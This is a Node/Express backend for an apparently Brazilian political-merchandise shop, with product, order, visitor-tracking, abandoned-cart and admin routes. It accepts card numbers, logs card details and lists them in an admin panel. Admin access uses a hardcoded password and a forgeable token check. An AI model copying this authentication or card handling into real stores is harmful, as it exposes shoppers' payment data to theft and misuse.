const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== BANCO DE DADOS MOCKADO ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 4, nome: "Moletom Canguru 2026", preco: 179.90, preco_antigo: 249.90, imagem: "https://placehold.co/600x800/e9e0d3/8b6b3d?text=MOLETOM", categoria: "Moletons", estoque: 20, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 5, nome: "Regata Dry Fit Brasil", preco: 69.90, preco_antigo: 99.90, imagem: "https://placehold.co/600x800/f2ede2/8b6b3d?text=REGATA", categoria: "Regatas", estoque: 40, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 6, nome: "Camiseta Deus Acima de Todos", preco: 79.90, preco_antigo: 109.90, imagem: "https://placehold.co/600x800/fcf7ef/8b6b3d?text=CAMISETA+BRANCA", categoria: "Camisetas", estoque: 60, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 7, nome: "Bandeira do Brasil 1,5m", preco: 79.90, preco_antigo: 99.90, imagem: "https://placehold.co/600x800/e8e0d0/8b6b3d?text=BANDEIRA", categoria: "Bandeiras", estoque: 25, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 8, nome: "Adesivo Kit 10 unid", preco: 29.90, preco_antigo: 49.90, imagem: "https://placehold.co/600x800/f5efe5/8b6b3d?text=ADESIVO", categoria: "Adesivos", estoque: 200, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 9, nome: "Chaveiro Personalizado", preco: 19.90, preco_antigo: 29.90, imagem: "https://placehold.co/600x800/fff0e0/8b6b3d?text=CHAVEIRO", categoria: "Acessórios", estoque: 150, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 10, nome: "Camiseta Força Verde", preco: 89.90, preco_antigo: 119.90, imagem: "https://placehold.co/600x800/eaefe5/8b6b3d?text=FORCA+VERDE", categoria: "Camisetas", estoque: 35, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 11, nome: "Boné Tático Militar", preco: 69.90, preco_antigo: 99.90, imagem: "https://placehold.co/600x800/ddd5c5/8b6b3d?text=BONE+TATICO", categoria: "Bonés", estoque: 45, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 12, nome: "Caneca Selo Nacional", preco: 49.90, preco_antigo: 69.90, imagem: "https://placehold.co/600x800/f8f0e0/8b6b3d?text=CANECA+SELO", categoria: "Canecas", estoque: 80, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 13, nome: "Moletom Brasil Flag", preco: 199.90, preco_antigo: 279.90, imagem: "https://placehold.co/600x800/e5dccd/8b6b3d?text=MOLETOM+BANDEIRA", categoria: "Moletons", estoque: 15, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 14, nome: "Regata Camuflada", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/f2ece0/8b6b3d?text=REGATA+CAMUFLADA", categoria: "Regatas", estoque: 55, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 15, nome: "Camiseta Exército BR", preco: 79.90, preco_antigo: 109.90, imagem: "https://placehold.co/600x800/f5ede0/8b6b3d?text=EXERCITO+BR", categoria: "Camisetas", estoque: 42, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 16, nome: "Boné Preto Dourado", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e8e0d0/8b6b3d?text=BONE+DOURADO", categoria: "Bonés", estoque: 38, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 17, nome: "Caneca Patriota", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff5e8/8b6b3d?text=CANECA+PATRIOTA", categoria: "Canecas", estoque: 95, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 18, nome: "Kit 3 Adesivos", preco: 19.90, preco_antigo: 39.90, imagem: "https://placehold.co/600x800/faf2e5/8b6b3d?text=KIT+ADESIVOS", categoria: "Adesivos", estoque: 300, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 19, nome: "Pulseira Patriotismo", preco: 14.90, preco_antigo: 24.90, imagem: "https://placehold.co/600x800/f0e8d8/8b6b3d?text=PULSEIRA", categoria: "Acessórios", estoque: 250, destaque: false, ativo: true, created_at: new Date().toISOString() },
    { id: 20, nome: "Camiseta Eu Apoio", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f8efe0/8b6b3d?text=EU+APOIO", categoria: "Camisetas", estoque: 28, destaque: true, ativo: true, created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];
let pixKey = '';

// ========== FUNÇÃO PARA DETECTAR BANDEIRA DO CARTÃO ==========
function detectCardBrand(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const patterns = {
        'Visa': /^4[0-9]{12}(?:[0-9]{3})?$/,
        'Mastercard': /^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/,
        'Elo': /^(4011|4312|4389|4514|4576|5044|5067|5090|6277|6362|6363|6504|6505|6506|6507|6509|6516|6550)/,
        'American Express': /^3[47][0-9]{13}$/,
        'Hipercard': /^(606282|3841)/,
        'Discover': /^(6011|65|64[4-9]|622)/,
        'JCB': /^(3528|3589|35[2-8][0-9])/
    };
    
    for (const [brand, pattern] of Object.entries(patterns)) {
        if (pattern.test(cleanNumber)) {
            return brand;
        }
    }
    return 'Unknown';
}

// ========== ROTAS PÚBLICAS ==========

// Listar produtos
app.get('/api/produtos', (req, res) => {
    const { categoria, destaque } = req.query;
    let filtered = produtos.filter(p => p.ativo === true);
    if (categoria) filtered = filtered.filter(p => p.categoria === categoria);
    if (destaque === 'true') filtered = filtered.filter(p => p.destaque === true);
    res.json({ success: true, produtos: filtered });
});

// Buscar CEP
app.get('/api/cep/:cep', async (req, res) => {
    const cep = req.params.cep.replace(/\D/g, '');
    if (cep.length !== 8) return res.json({ error: 'CEP inválido' });
    try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await response.json();
        if (data.erro) return res.json({ error: 'CEP não encontrado' });
        res.json({ success: true, logradouro: data.logradouro, bairro: data.bairro, cidade: data.localidade, uf: data.uf });
    } catch (error) {
        res.json({ error: 'Erro ao buscar CEP' });
    }
});

// Salvar pedido
app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    const pedido = { ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() };
    pedidos.unshift(pedido);
    console.log('Pedido salvo:', pedidoId);
    res.json({ success: true, pedido_id: pedidoId });
});

// Salvar cartão (com detecção de bandeira)
app.post('/api/cartao', (req, res) => {
    const { nome_titular, numero, ultimos_4, validade_mes, validade_ano, bandeira } = req.body;
    
    // Detectar bandeira se não veio
    let cardBrand = bandeira;
    if (!cardBrand && numero) {
        cardBrand = detectCardBrand(numero);
    }
    
    const novoCartao = {
        id: Date.now(),
        nome_titular,
        ultimos_4: ultimos_4 || (numero ? numero.slice(-4) : '****'),
        bandeira: cardBrand,
        validade_mes,
        validade_ano,
        created_at: new Date().toISOString()
    };
    cartoes.push(novoCartao);
    console.log('Cartão salvo:', novoCartao);
    res.json({ success: true, cartao: novoCartao });
});

// Registrar visitante
app.post('/api/visitante', (req, res) => {
    const { visitor_id, ip, user_agent, origem } = req.body;
    const existing = visitantes.find(v => v.visitor_id === visitor_id);
    if (existing) {
        existing.ultima_atividade = new Date().toISOString();
        existing.page_views = (existing.page_views || 0) + 1;
    } else {
        visitantes.push({
            visitor_id,
            ip,
            user_agent,
            origem: origem || 'direct',
            etapa: 'visitante',
            page_views: 1,
            primeira_visita: new Date().toISOString(),
            ultima_atividade: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

// Carrinho abandonado
app.post('/api/carrinho', (req, res) => {
    const { visitor_id, itens, total } = req.body;
    const existing = carrinhosAbandonados.find(c => c.visitor_id === visitor_id);
    if (existing) {
        existing.itens = itens;
        existing.total = total;
        existing.total_itens = itens.length;
        existing.updated_at = new Date().toISOString();
    } else {
        carrinhosAbandonados.push({
            visitor_id,
            itens,
            total,
            total_itens: itens.length,
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

// ========== LOGIN ADMIN ==========
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'capitao2025') {
        res.json({ success: true, token: 'admin_auth_' + Date.now() });
    } else {
        res.status(401).json({ success: false });
    }
});

// Middleware de autenticação
function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false });
    }
    next();
}

// ========== ADMIN: CRUD PRODUTOS ==========
app.get('/api/admin/produtos', verifyAdmin, (req, res) => {
    res.json({ success: true, produtos });
});

app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
    const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
    const novoProduto = { id: novoId, ...req.body, ativo: true, created_at: new Date().toISOString() };
    produtos.push(novoProduto);
    res.json({ success: true, produto: novoProduto });
});

app.put('/api/admin/produtos/:id', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) return res.status(404).json({ success: false });
    produtos[index] = { ...produtos[index], ...req.body, id: produtos[index].id };
    res.json({ success: true });
});

app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) return res.status(404).json({ success: false });
    produtos.splice(index, 1);
    res.json({ success: true });
});

// ========== ADMIN: OUTRAS ROTAS ==========
app.get('/api/admin/pedidos', verifyAdmin, (req, res) => {
    res.json({ success: true, pedidos });
});

app.get('/api/admin/cartoes', verifyAdmin, (req, res) => {
    res.json({ success: true, cartoes });
});

app.get('/api/admin/visitantes', verifyAdmin, (req, res) => {
    res.json({ success: true, visitantes });
});

app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => {
    res.json({ success: true, carrinhos: carrinhosAbandonados });
});

app.get('/api/admin/stats', verifyAdmin, (req, res) => {
    const online = visitantes.filter(v => new Date(v.ultima_atividade) > new Date(Date.now() - 5 * 60 * 1000)).length;
    const revenue = pedidos.reduce((sum, p) => sum + (parseFloat(p.total) || 0), 0);
    res.json({
        success: true,
        stats: { online, abandoned_carts: carrinhosAbandonados.length, total_cards: cartoes.length, revenue, total_products: produtos.filter(p => p.ativo).length, total_orders: pedidos.length }
    });
});

app.get('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true, pix_key: pixKey });
});

app.post('/api/admin/pix', verifyAdmin, (req, res) => {
    pixKey = req.body.pix_key;
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
});